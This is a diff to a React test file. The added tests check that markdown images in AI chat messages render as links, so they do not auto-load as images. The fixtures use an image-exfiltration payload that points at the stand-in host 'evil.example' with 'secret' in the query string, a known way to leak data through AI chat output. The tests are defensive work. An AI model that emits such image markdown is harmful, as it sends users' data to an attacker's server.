@@ -5,15 +5,17 @@ import React from 'react';
 import { renderToStaticMarkup } from 'react-dom/server';
 import { feedbackView } from '../feedback';
 import type { CommandAction, CommandFormField, CommandView } from '../model';
-import { MarkdownContent } from '../ui';
+import { MarkdownContent } from '../markdown-content';
+import {
+  ExtensionViewRenderer,
+  type ExtensionViewRendererProps,
+  NevermindLimitGate,
+} from './extension-view';
 import {
   EXTENSION_WEBVIEW_ALLOW,
   EXTENSION_WEBVIEW_SANDBOX,
-  ExtensionViewRenderer,
-  type ExtensionViewRendererProps,
   extensionWebviewAllow,
-  NevermindLimitGate,
-} from './extension-view';
+} from './extension-webview-permissions';
 import {
   nextNavigationState,
   previousNavigationState,
@@ -687,6 +689,74 @@ test('renders markdown headings with host typography hooks', () => {
     html,
     /<h1 class="markdownHeading markdownHeading1">Preview Fixture<\/h1>/,
   );
+});
+
+test('markdown images become links when remote images are not rendered', () => {
+  const content = '![x](https://evil.example/p?d=secret)';
+  const linked = renderToStaticMarkup(
+    <MarkdownContent content={content} remoteImages="links" />,
+  );
+
+  assert.doesNotMatch(linked, /<img/);
+  assert.match(
+    linked,
+    /<a href="https:\/\/evil\.example\/p\?d=secret" target="_blank" rel="noreferrer">x<\/a>/,
+  );
+});
+
+test('markdown images render by default', () => {
+  const html = renderToStaticMarkup(
+    <MarkdownContent content={'![x](https://evil.example/p?d=secret)'} />,
+  );
+
+  assert.match(html, /<img src="https:\/\/evil\.example\/p\?d=secret"/);
+});
+
+test('AI chat messages render markdown with remote images as links', () => {
+  const optionsSeen: unknown[] = [];
+  renderExtensionView(
+    { type: 'chat', title: 'AI Chat', aiChat: true, messages: [] },
+    {
+      messages: [
+        { role: 'assistant', content: '![x](https://evil.example/p?d=secret)' },
+      ],
+    },
+    {
+      renderMarkdown: (content, options) => {
+        optionsSeen.push(options);
+        return (
+          <MarkdownContent
+            content={content}
+            remoteImages={options?.remoteImages}
+          />
+        );
+      },
+    },
+  );
+
+  assert.deepEqual(optionsSeen, [{ remoteImages: 'links' }]);
+});
+
+test('extension chat messages keep inline markdown images', () => {
+  const optionsSeen: unknown[] = [];
+  renderExtensionView(
+    {
+      type: 'chat',
+      title: 'Chat',
+      messages: [
+        { role: 'assistant', content: '![x](https://example.com/a.png)' },
+      ],
+    },
+    undefined,
+    {
+      renderMarkdown: (content, options) => {
+        optionsSeen.push(options);
+        return <MarkdownContent content={content} />;
+      },
+    },
+  );
+
+  assert.deepEqual(optionsSeen, [undefined]);
 });
 
 test('nested navigation preserves the parent view when pushing a child', () => {
